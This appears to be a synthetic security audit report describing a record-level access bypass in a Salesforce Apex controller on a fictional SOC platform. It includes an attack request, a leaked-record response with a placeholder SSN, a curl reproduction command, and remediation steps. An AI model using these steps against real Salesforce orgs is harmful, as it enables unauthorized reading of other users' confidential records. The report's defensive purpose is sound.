# Security Analysis Report
**System:** ThreatLens SOC Platform (Salesforce-Integrated)
**Domain:** Cybersecurity / SIEM
**Example ID:** SF-0083
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.2 | SOQL record-level access bypass on `OpportunityController.getOpportunity` — attacker reads any SOC Opportunity record without Salesforce sharing enforcement |

---

## Finding 1 — Platform: SOQL and Salesforce Record-Level Access Bypass on Opportunity Object (Pattern 9.2)

### Summary
The Apex controller `OpportunityController` on ThreatLens SOC Platform (`f720dfe9.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Opportunity object. The SOQL query in §4.0 contains no `AND OwnerId = :UserInfo.getUserId()` predicate and no `WITH SECURITY_ENFORCED` clause. Per §5.0 Pattern 9.2, the Salesforce platform sharing rules are completely bypassed.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getOpportunityDetails(String opportunityId, ...)` while the Aura descriptor in §6.0 is `c.OpportunityController.getOpportunity`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://f720dfe9.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://f720dfe9.lightning.force.com/aura
Authorization: Bearer 00DF720DFE9!ARf720dfe9...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DF720DFE9!ARf720dfe9...

message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN",
"params":{"opportunityId":"001DFE9","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Opportunity Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001DFE9", "Name": "Victim Opportunity Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-31-2820"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DF720DFE9!ARf720dfe9..."
curl -s -X POST "https://f720dfe9.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"001DFE9","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-31-2820
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class OpportunityController { ... }`
2. `WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
